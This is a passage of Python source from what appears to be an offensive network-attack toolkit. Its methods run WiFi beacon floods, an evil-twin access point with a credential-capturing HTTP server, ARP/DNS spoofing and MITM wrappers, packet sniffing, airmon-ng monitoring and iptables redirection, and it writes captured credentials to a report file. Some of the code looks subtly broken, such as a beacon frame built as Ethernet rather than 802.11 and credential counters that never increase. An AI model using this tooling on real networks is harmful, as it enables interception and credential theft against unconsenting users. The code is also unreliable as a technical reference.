        self._require_scapy("wifi_beacon_flood")
        self.log(f"[WiFi-BEAC] Beacon flood with SSID prefix '{ssid}'", "warning")
        self.is_running = True
        interface = self._get_default_interface()
        count = 0

        def _beacon_flood():
            nonlocal count
            self.log("[WiFi-BEAC] Sending beacon frames…", "info")
            while self.is_running:
                try:
                    fake_mac = self._random_mac()
                    name = f"{ssid}-{random.randint(1000, 9999)}"
                    beacon = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / Raw(
                        load=(
                            b"\x00\x00"  # Beacon
                            + b"\xff\xff\xff\xff\xff\xff"
                            + bytes.fromhex(fake_mac.replace(":", ""))
                            + bytes.fromhex(fake_mac.replace(":", ""))
                            + b"\x00\x00"
                            + b"\x00\x00\x00\x00\x00\x00"
                            + b"\x64\x00"  # Beacon interval
                            + b"\x31\x04"  # Capability info
                            + b"\x00" * 12  # SSID padding
                            + bytes([len(name)])
                            + name.encode()
                        )
                    )
                    sendp(beacon, iface=interface, verbose=False)
                    count += 1
                    time.sleep(0.05)
                except Exception as e:
                    self.log(f"[WiFi-BEAC] Error: {e}", "error")
                    time.sleep(1)

        thread = threading.Thread(target=_beacon_flood, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "ssid_prefix": ssid, "beacons_sent": count, "interface": interface}
        with self._lock:
            self.results["wifi_beacon_flood"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  19. WiFi Evil Twin
    # ──────────────────────────────────────────────────────────
    def wifi_evil_twin(self, ssid):
        """Create an evil twin access point mimicking a target SSID."""
        self.log(f"[WiFi-EVIL] Creating evil twin of '{ssid}'", "warning")
        self.is_running = True
        interface = self._get_default_interface()

        # airbase-ng based evil twin
        def _run_evil():
            cmd = f"sudo airbase-ng -e '{ssid}' -c 6 {interface}"
            self.run_command(cmd, timeout=600)

        thread = threading.Thread(target=_run_evil, daemon=True)
        thread.start()
        self._threads.append(thread)

        # Start credential capture on port 80
        self.rogue_http_server(port=8080)

        result = {"status": "active", "ssid": ssid, "interface": interface, "capture_port": 8080}
        with self._lock:
            self.results["wifi_evil_twin"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  20. Generate Comprehensive Report
    # ──────────────────────────────────────────────────────────
    def generate_report(self):
        """Generate a comprehensive report of all attacks and captured data."""
        elapsed = None
        if self._attack_start_time:
            elapsed = (datetime.now() - self._attack_start_time).total_seconds()

        active_attacks = [k for k, v in self.results.items() if isinstance(v, dict) and v.get("status") == "active"]

        credential_summary = {
            "total_captured": len(self._captured_credentials),
            "by_type": {},
        }
        for entry in self._captured_credentials:
            ctype = "ssh" if "ssh" in str(self.results) else "ftp"
            credential_summary["by_type"].setdefault(ctype, 0)

        report = {
            "title": "Network Attacks Comprehensive Report",
            "version": "5.0",
            "timestamp": datetime.now().isoformat(),
            "duration_seconds": elapsed,
            "total_attacks_launched": len([k for k in self.results]),
            "active_attacks": active_attacks,
            "scapy_available": SCAPY_AVAILABLE,
            "platform": platform.system(),
            "credential_captures": credential_summary,
            "detailed_results": self.results,
            "captured_credentials": self._captured_credentials,
        }

        # Persist to disk
        tmp_dir = tempfile.gettempdir()
        report_path = os.path.join(tmp_dir, "network_attack_report.json")
        try:
            with open(report_path, "w") as f:
                json.dump(report, f, indent=2, default=str)
            self.log(f"[REPORT] Saved to {report_path}", "success")
            report["saved_to"] = report_path
        except Exception as e:
            self.log(f"[REPORT] Failed to save: {e}", "error")

        return report

    # ──────────────────────────────────────────────────────────
    #  Helpers
    # ──────────────────────────────────────────────────────────
    def _enable_ip_forward(self):
        """Enable IP forwarding on the current platform."""
        if platform.system() == "Linux":
            self.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
        elif platform.system() == "Darwin":
            self.run_command("sysctl -w net.inet.ip.forwarding=1")

    def _disable_ip_forward(self):
        """Disable IP forwarding."""
        if platform.system() == "Linux":
            self.run_command("echo 0 > /proc/sys/net/ipv4/ip_forward")
        elif platform.system() == "Darwin":
            self.run_command("sysctl -w net.inet.ip.forwarding=0")

    def _get_local_ip(self, interface=None):
        """Get local IP address for an interface."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ──────────────────────────────────────────────────────────
    #  Keep legacy methods
    # ──────────────────────────────────────────────────────────
    def arp_spoofing(self, target_ip, gateway_ip, interface="eth0"):
        """Legacy ARP Spoofing – kept for backward compatibility."""
        return self.arp_spoofing_advanced(target_ip, gateway_ip, interface)

    def dns_spoofing(self, target_ip, fake_ip, interface="eth0"):
        """Legacy DNS Spoofing – kept for backward compatibility."""
        return self.dns_poisoning(target_ip, fake_ip, "*")

    def packet_sniffing(self, interface="eth0", count=100):
        """Packet sniffing"""
        self.log(f"Starting sniffing on {interface}", "info")
        tmp_dir = tempfile.gettempdir()
        sniffed_pcap = f"{tmp_dir}/sniffed.pcap"
        cmd = f"tcpdump -i {interface} -c {count} -w {sniffed_pcap}"
        try:
            result = self.run_command(cmd, timeout=60)
            self.log("Sniffing completed", "success")
            analyze_cmd = f"tshark -r {sniffed_pcap} -T fields -e ip.src -e ip.dst -e tcp.port"
            analysis = self.run_command(analyze_cmd)
            self.results["sniffing"] = {"pcap_file": sniffed_pcap, "analysis": analysis}
            return analysis
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return None

    def mitm_attack(self, target_ip, gateway_ip, interface="eth0"):
        """Legacy MITM – kept for backward compatibility."""
        return self.arp_spoofing_advanced(target_ip, gateway_ip, interface)

    def wifi_attack(self, interface="wlan0", target_bssid=None):
        """WiFi attack"""
        self.log(f"Starting WiFi attack on {interface}", "warning")
        self.run_command("airmon-ng check kill")
        self.run_command(f"airmon-ng start {interface}")
        cmd = f"airodump-ng {interface}mon"
        try:
            self.run_command(cmd)
            self.log("WiFi scan completed", "success")
            self.results["wifi_attack"] = {"status": "scanning", "interface": f"{interface}mon"}
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")

    def port_forwarding(self, local_port, remote_host, remote_port):
        """Port Forwarding"""
        self.log(f"Configuring port forwarding: {local_port} -> {remote_host}:{remote_port}", "info")
        if platform.system() != "Linux":
            self.log("Port forwarding via iptables is only supported on Linux", "error")
            return
        cmd = f"iptables -t nat -A PREROUTING -p tcp --dport {local_port} -j REDIRECT --to-port {remote_port}"
        try:
            self.run_command(cmd)
            self.log("Port forwarding configured", "success")
            self.results["port_forwarding"] = {
                "status": "active",
                "local_port": local_port,
                "remote_host": remote_host,
                "remote_port": remote_port,
            }
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")

    # ──────────────────────────────────────────────────────────
    #  Stop / Cleanup
    # ──────────────────────────────────────────────────────────
    def stop_all(self):
        """Stop all running attacks and clean up."""
        self.is_running = False
        self.log("Stopping all attacks…", "warning")
        self._disable_ip_forward()

        if platform.system() == "Windows":
            procs = ["arpspoof.exe", "bettercap.exe", "tcpdump.exe", "yersinia.exe", "dnsmasq.exe", "airbase-ng.exe"]
        else:
            procs = ["arpspoof", "bettercap", "tcpdump", "yersinia", "dnsmasq", "airbase-ng"]

        for proc in procs:
            self.run_command(f"killall {proc}")

        for t in self._threads:
            if t.is_alive():
                t.join(timeout=2)
        self._threads.clear()

        self.log("All attacks stopped", "success")
        return {"status": "stopped", "timestamp": datetime.now().isoformat()}
